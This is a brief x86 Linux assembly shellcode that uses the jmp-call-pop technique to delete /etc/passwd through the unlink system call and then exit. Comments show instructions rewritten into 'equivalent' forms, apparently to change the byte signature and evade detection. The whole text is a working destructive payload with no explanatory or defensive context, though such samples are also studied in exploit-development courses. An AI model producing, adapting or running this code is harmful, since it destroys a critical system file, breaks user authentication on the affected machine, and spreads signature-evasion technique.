global _start
section .text
  _start:
    jmp    call_shellcode

  executeit:
    pop    esi

    ; Equivilent Instructions for:
    ; xor    eax,eax

    mov    eax, ecx
    xor    eax, ecx

    xor    ecx,ecx
    xor    edx,edx

    ; Equivilent Instructions for:
    ; mov    al,0xa
    mov    al, 0xc
    sub    al, 0x2

    mov    ebx,esi
    int    0x80
    mov    al,0x1
    int    0x80

  call_shellcode:
    call executeit
    FileToDelete: db "/etc/passwd"
